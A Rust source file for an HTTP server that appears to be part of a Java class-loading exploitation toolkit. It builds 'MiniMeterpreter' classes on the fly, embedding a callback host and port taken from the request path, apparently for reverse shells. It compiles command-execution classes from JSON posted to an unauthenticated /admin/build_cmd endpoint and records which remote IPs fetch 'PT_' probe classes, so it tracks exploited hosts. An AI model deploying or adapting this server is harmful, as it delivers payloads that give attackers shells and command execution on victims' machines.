use crate::common::{ServerCfg, BuildCmdCfg, Access};
use crate::build_java;

use tokio::net::TcpStream;
use hyper::server::conn::Http;

use hyper::service::service_fn;
use hyper::{Body, Method, Request, Response, StatusCode};
use anyhow::Context;
use anyhow;

use serde_json;

#[derive(Clone)]
struct WebService{
    file_server : hyper_staticfile::Static,
    cfg : ServerCfg,
}

impl WebService{
    pub fn new(cfg: ServerCfg)->WebService{
        WebService{
            file_server : hyper_staticfile::Static::new(&cfg.rsc.web_root), 
            cfg,
        }
    }
    /// Serve a request.
    pub async fn serve(self, req: Request<Body>, rem_ip : String) -> Result<Response<Body>, anyhow::Error> {
        println!("We have  request {} : {}", req.method(), req.uri().path());
        match (req.method(), req.uri().path()) {
            (&Method::GET, p)  if p.starts_with("/admin")  => {
                self.process_admin_urls(req).await
            },
            (&Method::GET, p)  if p.starts_with("/PT_") && p.ends_with(".class")  => {
                self.process_pt_class(req, rem_ip).await
            },
            _ => {  
                let path = req.uri().path()[1..].to_string();
                match self.cfg.caches.get_class(&path) {
                    Some(the_class) => {
//                        println!("we have a cache match");
                        Ok(Response::new(Body::from(the_class)))
                    },
                    None => {
                        if path.starts_with("MM_") {
                            self.process_mm(req).await
                        }else{
                            if self.cfg.rsc.no_fs {
                                self.not_found().await
                            }else{
                                match self.file_server.serve(req).await {
                                    Ok(r) => Ok(r),
                                    Err(ioe) => Err(ioe.into())
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    async fn process_admin_urls(self, req: Request<Body>) -> Result<Response<Body>, anyhow::Error> {
        //if we want to assign some osrt of auth for admin urls we can do this here
        //perhaps add a cmd line switch for a auth token
        match (req.method(), req.uri().path()) {
            (&Method::GET, p)  if p.starts_with("/admin/id_access/")  => {
                let id = p[17..].to_string();  //grab everthing after /admin/id_access/
                match serde_json::to_string(&self.cfg.caches.get_access_for_id(&id))
                    .context(format!("Error converting json for id ({})", id)){
                        Ok(js) =>  Ok(Response::new(Body::from(js))),
                        Err(e) => Err(e.into()),
                    }
            },
            (&Method::GET, "/admin/server_cfg") => Ok(Response::new(Body::from(
                        json!({"addr":self.cfg.rsc.addr
                            , "open_ports":self.cfg.caches.get_open_ports()
                                , "failed_ports":self.cfg.caches.get_failed_ports()
                        }).to_string(),
            ))),
            (&Method::POST, "/admin/build_cmd") => {
                if self.cfg.rsc.allow_build_cmd {
                    self.build_cmd(req).await
                }else {
                    self.not_found().await
                }
            }
            (&Method::GET, "/admin/next_id") => Ok(Response::new(Body::from(
                        self.cfg.caches.get_next_id()
            ))),
            (&Method::GET, "/admin/all_id_access") => {
                match self.cfg.caches.get_all_id_access_as_json(){
                    Ok(js) =>  Ok(Response::new(Body::from(js))),
                    Err(e) => Err(e.into()),
                }
            }
            _ => {  
                self.not_found().await
            }
        }
    }

    async fn not_found(&self) -> Result<Response<Body>, anyhow::Error>{
        let mut not_found = Response::default();
        *not_found.status_mut() = StatusCode::NOT_FOUND;
        Ok(not_found)
    }

    async fn body_as_string(&self, req: Request<Body>) -> Result<String, anyhow::Error>{
        let raw_body =  hyper::body::to_bytes(req.into_body()).await.context("Error converting body as string")?;
        String::from_utf8(raw_body.to_vec()).context("Error reading body as string")
    }

    async fn process_mm(&self, req : Request<Body>) -> Result<Response<Body>, anyhow::Error>{
        let path = &req.uri().path();
        if ! ( path.starts_with("/MM_") && path.ends_with(".class") ){
            return Err(anyhow::Error::msg("Invalid MiniMeterpreter clss name"));
        }
        let class_name = &req.uri().path()[1..];
        let parts : Vec<&str> = class_name[0..class_name.len()-".class".len()].split("_").collect();
        let last = parts.len()-1;
        let port = &parts[last];
        if parts.len() < 3 || class_name.contains("/")  || port.parse::<u16>().is_err() {
            println!("Error : unable to create MM class. {} is invalid.", req.uri().path());
            return self.not_found().await;
        }
        println!("we are processing a MM");
        let host = &parts[1..last].join(".");
        let the_class = build_java::build_mm_class(&class_name, &host, &port);
        self.cfg.caches.set_class(class_name.to_string(), the_class.clone());
        Ok(Response::new(Body::from(the_class)))
    }

    async fn build_cmd(&self, req: Request<Body>) -> Result<Response<Body>, anyhow::Error> {
        let body = self.body_as_string(req).await?;
        let build_cmd = serde_json::from_str::<BuildCmdCfg>(&body).context("Error parsing json")?;
        let the_class = build_java::build_cmd_class(build_cmd.clone());
        let class_name = format!("{}.class", build_cmd.class_name);
        self.cfg.caches.set_class(class_name, the_class);
        return Ok(Response::new(Body::from(format!("Created new class for {:?} -- \n\n\n", build_cmd))));
    }

    pub async fn process_pt_class(&self, req: Request<Body>, rem_host : String) -> Result<Response<Body>, anyhow::Error> {
        let p = req.uri().path();
        if p.starts_with("/PT_") && p.ends_with(".class") {
            let start = "/PT_".len();
            let end = p.len()-".class".len();
            let id = p[start..end].to_string();  //grab the id only /PT_12345.class'
            self.cfg.caches.add_access_for_id(&id, Access::new_http(rem_host, self.cfg.port));
        }
        self.not_found().await
    }
}

pub async fn process_http(s : TcpStream, cfg : ServerCfg){
    //let hw = WebService::new(cfg.clone());
    let rem_ip : String = match &s.peer_addr() {
        Ok(addr) => addr.ip().to_string(),
        Err(_e) => "unknown".to_string()
    };
    let service = |r| WebService::new(cfg.clone()).serve(r, rem_ip.clone());

    if let Err(http_err) = Http::new()
        .http1_only(true)
        .serve_connection(s, service_fn(&service))
        .await {
            eprintln!("Error while serving HTTP connection: {}", http_err);
        }
}

